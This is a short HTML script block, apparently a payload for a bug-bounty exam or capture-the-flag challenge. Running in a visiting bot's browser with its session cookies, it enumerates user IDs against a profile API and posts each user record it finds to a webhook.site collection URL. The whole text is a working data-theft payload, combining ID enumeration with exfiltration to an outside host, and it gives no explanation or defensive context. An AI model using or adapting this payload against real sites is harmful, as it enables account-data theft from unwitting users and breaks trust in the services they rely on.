<script>
    const logger = "https://webhook.site/68d67ea7-f29d-470c-a202-019f330a7bc6";
    const apiBase = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile/";
    const base = "69da4749adf0dbb976ce8e"; 

    async function fastSweep() {
        const hex = "0123456789abcdef";
        
        // We will only sweep a smaller, targeted range to ensure it finishes 
        // before the bot closes the page.
        for (let h of hex) {
            let target = base + "3" + h; // Adjusting the "3" to match your found ID range
            try {
                const response = await fetch(apiBase + target, { credentials: "include" });
                const json = await response.json();
                
                if (json.success) {
                    // We send the result immediately
                    await fetch(`${logger}?found=${target}`, {
                        method: "POST",
                        mode: "no-cors", // Use no-cors to bypass potential preflight delays
                        body: JSON.stringify(json.data.user)
                    });
                }
            } catch (e) {}
        }
        
        // Final signal so you know the bot finished the script
        fetch(logger + "?status=DONE");
    }

    fastSweep();
</script>
